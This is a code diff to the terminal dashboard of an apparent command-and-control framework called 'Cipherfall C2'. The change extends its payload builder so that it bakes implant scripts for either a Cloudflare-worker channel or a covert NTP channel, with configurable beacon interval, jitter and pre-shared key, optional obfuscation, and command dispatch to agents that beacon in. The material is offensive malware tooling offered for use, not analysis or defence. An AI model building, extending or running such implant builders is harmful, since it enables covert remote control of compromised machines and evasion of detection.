@@ -5,8 +5,8 @@ tui.py — Cipherfall C2 Terminal Dashboard
 Two-tab interactive TUI:
   Agents  — list active agents, browse task history, dispatch commands.
             Agents auto-appear as soon as they beacon; no manual registration.
-  Payload — bake agent.py with custom settings (interval, jitter, URL, PSK)
-            and optionally obfuscate with Modules/Obfuscator/obfuscator_py.py.
+  Payload — bake cloudflare/agent.py or ntp/agent.py with custom settings
+            (type, interval, jitter, PSK, worker URL) and optionally obfuscate.
 
 Usage:
     python tui.py
@@ -25,7 +25,7 @@ from textual.binding import Binding
 from textual.containers import Horizontal, Vertical
 from textual.widgets import (
     Button, DataTable, Footer, Header, Input,
-    Label, RichLog, Static, Switch, TabbedContent, TabPane,
+    Label, RichLog, Select, Static, Switch, TabbedContent, TabPane,
 )
 import httpx
 
@@ -49,8 +49,27 @@ def _ago(epoch: int) -> str:
     return f"{d // 3600}h"
 
 
-def _bake_agent(worker_url: str, psk: str, interval: int,
-                jitter: int, out_name: str) -> pathlib.Path:
+def _patch_agent(src: str, psk: str, interval: int, jitter: int) -> str:
+    src = re.sub(
+        r'BEACON_INT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+        f'BEACON_INT = int(os.environ.get("C2_INT", "{interval}"))',
+        src,
+    )
+    src = re.sub(
+        r'JITTER\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+        f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
+        src,
+    )
+    src = re.sub(
+        r'C2_PSK\s*=\s*os\.environ\.get\([^)]+\)',
+        f'C2_PSK     = os.environ.get("C2_PSK", "{psk}")',
+        src,
+    )
+    return src
+
+
+def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
+                            jitter: int, out_name: str) -> pathlib.Path:
     src = (HERE / "agent.py").read_text(encoding="utf-8")
     src = re.sub(
         r'WORKER_URL\s*=\s*os\.environ\.get\([^)]+\)',
@@ -77,8 +96,19 @@ def _bake_agent(worker_url: str, psk: str, interval: int,
     return out
 
 
+def _bake_agent_ntp(psk: str, interval: int, jitter: int,
+                    out_name: str) -> pathlib.Path:
+    ntp_agent = HERE.parent / "ntp" / "agent.py"
+    if not ntp_agent.exists():
+        raise FileNotFoundError(f"ntp agent not found: {ntp_agent}")
+    src = _patch_agent(ntp_agent.read_text(encoding="utf-8"), psk, interval, jitter)
+    out = HERE / out_name
+    out.write_text(src, encoding="utf-8")
+    return out
+
+
 def _obfuscate(agent_path: pathlib.Path) -> pathlib.Path:
-    obf = HERE.parent / "Obfuscator" / "obfuscator_py.py"
+    obf = HERE.parent.parent / "Obfuscator" / "obfuscator_py.py"
     if not obf.exists():
         raise FileNotFoundError(f"obfuscator not found: {obf}")
     subprocess.run([sys.executable, str(obf), str(agent_path)], check=True)
@@ -128,6 +158,7 @@ TabbedContent > TabPane { padding: 0; height: 1fr; }
 
 #btn-generate  { width: 72; margin-top: 1; }
 #payload-status { padding: 1 1; height: 3; }
+#row-url { height: 3; margin-bottom: 1; }
 
 /* ── Shared ── */
 Label {
@@ -185,6 +216,12 @@ class CipherfallTUI(App):
                     with Vertical(id="payload-inner"):
                         yield Label(" PAYLOAD BUILDER")
                         with Horizontal(classes="form-row"):
+                            yield Label("AGENT TYPE", classes="form-label")
+                            yield Select(
+                                [("cloudflare", "cloudflare"), ("ntp", "ntp")],
+                                id="p-type", value="cloudflare",
+                            )
+                        with Horizontal(classes="form-row", id="row-url"):
                             yield Label("WORKER URL", classes="form-label")
                             yield Input(id="p-url", value=_DEFAULT_URL)
                         with Horizontal(classes="form-row"):
@@ -333,6 +370,12 @@ class CipherfallTUI(App):
         log.write(f"[yellow]queued  →  task {result['task_id'][:8]}[/yellow]")
         await self._load_tasks(self._selected_agent)
 
+    def on_select_changed(self, event: Select.Changed) -> None:
+        if event.select.id != "p-type":
+            return
+        is_cf = event.value == "cloudflare"
+        self.query_one("#row-url").display = is_cf
+
     async def on_button_pressed(self, event: Button.Pressed) -> None:
         if event.button.id != "btn-generate":
             return
@@ -340,6 +383,7 @@ class CipherfallTUI(App):
         status = self.query_one("#payload-status", Static)
         status.update("[yellow]generating…[/yellow]")
 
+        agent_type = self.query_one("#p-type",   Select).value
         worker_url = self.query_one("#p-url",    Input).value.strip().rstrip("/")
         psk        = self.query_one("#p-psk",    Input).value.strip()
         interval   = int(self.query_one("#p-int",    Input).value.strip() or "30")
@@ -348,12 +392,17 @@ class CipherfallTUI(App):
         out_name   = self.query_one("#p-out",    Input).value.strip() or "agent_payload.py"
 
         try:
-            out = await asyncio.to_thread(
-                _bake_agent, worker_url, psk, interval, jitter, out_name
-            )
+            if agent_type == "ntp":
+                out = await asyncio.to_thread(
+                    _bake_agent_ntp, psk, interval, jitter, out_name
+                )
+            else:
+                out = await asyncio.to_thread(
+                    _bake_agent_cloudflare, worker_url, psk, interval, jitter, out_name
+                )
             if obfuscate:
                 out = await asyncio.to_thread(_obfuscate, out)
-            status.update(f"[green]✓  generated →  {out.name}[/green]")
+            status.update(f"[green]✓  {agent_type} agent → {out.name}[/green]")
         except Exception as e:
             status.update(f"[red]error: {e}[/red]")
 
